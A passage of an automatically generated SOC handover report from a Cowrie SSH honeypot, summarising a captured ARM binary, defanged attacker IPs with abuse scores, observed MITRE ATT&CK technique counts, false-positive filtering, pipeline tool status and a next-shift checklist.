| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `190.56.162[.]181` | GT | Telgua | **100** ⚠️ | 16 |
| `27.123.114[.]126` | IN | Bharti Airtel Limited | **100** ⚠️ | 17 |
| `178.178.194[.]123` | RU | Metropolitan branch of PJSC MegaFon | **100** ⚠️ | 16 |
| `58.56.151[.]234` | CN | CHINANET SHANDONG PROVINCE NETWORK | **100** ⚠️ | 32 |
| `179.181.133[.]153` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 33 |
| `180.76.170[.]111` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 34 |
| `90.189.152[.]114` | RU | OJSC Sibirtelecom | **100** ⚠️ | 16 |
| `46.77.69[.]201` | PL | Polkomtel sp. z o.o. | **100** ⚠️ | 14 |
| `152.32.235[.]36` | US | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `183.232.212[.]207` | CN | China Mobile Communications Corporation | **100** ⚠️ | 35 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 75 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 31 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 5 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |

---

## 🔕 False Positive Summary (37 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 10 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 35 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 132 cases |
| Tool 34  | Credential Extractor        | ✅ 36 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 50 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 37 filtered (28.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 35 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 10 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 5 priority case(s) shown individually · 36 recon entry/entries in table (8 group(s) consolidating 62 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-20T04:13:33Z_
